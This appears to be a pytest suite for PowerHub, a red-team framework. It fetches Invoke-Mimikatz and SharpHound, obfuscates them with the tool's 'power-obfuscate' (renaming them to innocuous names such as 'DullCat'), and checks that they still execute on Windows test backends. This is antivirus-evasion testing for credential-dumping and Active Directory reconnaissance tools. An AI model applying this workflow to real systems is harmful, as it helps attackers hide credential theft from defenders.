#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import subprocess
import sys
import tempfile

import pytest
import requests

sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
from test_init import BACKENDS, init_tests, execute_cmd  # noqa

init_tests()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DECOY_DIR = os.path.join(BASE_DIR, '..', 'powerhub', 'decoy')
DECOYS = os.listdir(DECOY_DIR)

MIMIKATZ_URL = "https://github.com/samratashok/nishang/raw/414ee1104526d7057f9adaeee196d91ae447283e/Gather/Invoke-Mimikatz.ps1"  # noqa
SHARPHOUND_URL = "https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip"  # noqa

payloads = {
    "mimikatz": dict(
        url=MIMIKATZ_URL,
        filename='Invoke-Mimikatz.ps1',
        epilogue='Invoke-Mimikatz -Command \'"coffee"\'',
    ),
    "sharphound.exe": dict(
        url=SHARPHOUND_URL,
        filename='SharpHound.exe',
        epilogue='SharpHound.exe --help',
    ),
    "sharphound.ps1": dict(
        url=SHARPHOUND_URL,
        filename='SharpHound.ps1',
        epilogue='Invoke-BloodHound',
    ),
}

cli_params = {
    "none": [],
    "natural": ['-n'],
    "decoy": ['-y'],
    "slow": ['-s'],
    "natural+decoy": ['-n', '-y'],
}


@pytest.fixture(scope='package', params=list(payloads.keys()))
def payload(request):
    cachedir = os.getenv("XDG_CACHE_HOME", os.path.expanduser("~/.cache"))
    cachedir = os.path.join(cachedir, 'powerhub_tests')
    if not os.path.exists(cachedir):
        os.makedirs(cachedir)

    param = payloads[request.param]
    basename = param['url'].split('/')[-1]

    filename = os.path.join(cachedir, basename)
    if not os.path.exists(filename):
        r = requests.get(param['url'], stream=True)
        with open(filename, 'wb') as fd:
            for chunk in r.iter_content(chunk_size=1024):
                fd.write(chunk)

    if basename.lower().endswith('zip'):
        zip_archive = filename
        filename = os.path.join(cachedir, param['filename'])
        if not os.path.exists(filename):
            command = ['unzip', '-o', zip_archive, '-d', cachedir]
            subprocess.run(command)
        assert os.path.exists(filename)

    yield filename, param['epilogue']


@pytest.fixture(params=list(cli_params.keys()))
def parameters(request):
    yield cli_params[request.param]


@pytest.fixture(params=list(BACKENDS.keys())[1:])
def backend(request):
    """Parameterize backends"""
    return BACKENDS[request.param]


def copy_and_execute(backend, filename):
    basename = os.path.basename(filename)
    execute_cmd(backend, f"{filename} C:/Windows/Temp/{basename}", copy=True)
    out = execute_cmd(backend, f"Import-Module C:/Windows/Temp/{basename}")
    return out


def test_decoys(backend):
    content = ""
    for file in DECOYS:
        if file.endswith('.ps1'):
            content += open(os.path.join(DECOY_DIR, file), 'r').read() + '\n'*3
    tmpf = tempfile.NamedTemporaryFile('w', delete=False,
                                       prefix="powerhub_test_decoy")
    tmpf.write(content)
    tmpf.close()

    out = copy_and_execute(backend, tmpf.name)
    assert "error" not in out


def test_power_obfuscate(parameters, payload, backend):
    from powerhub.__main__ import power_obfuscate

    filename, epilogue = payload
    safe_name = filename.replace('mikatz', 'nicats')
    safe_name = safe_name.replace('SharpHound', 'DullCat')
    out = os.path.join(os.path.dirname(filename), safe_name + ".ps1")

    sys.argv = ['power-obfuscate', '-i', filename, '-o', out, '-e', epilogue] + parameters
    power_obfuscate()

    output = copy_and_execute(backend, out)

    assert "error" not in output
    # Check for mimikatz or sharphound banner
    assert "DELPY" in output \
        or "Collection Methods" in output
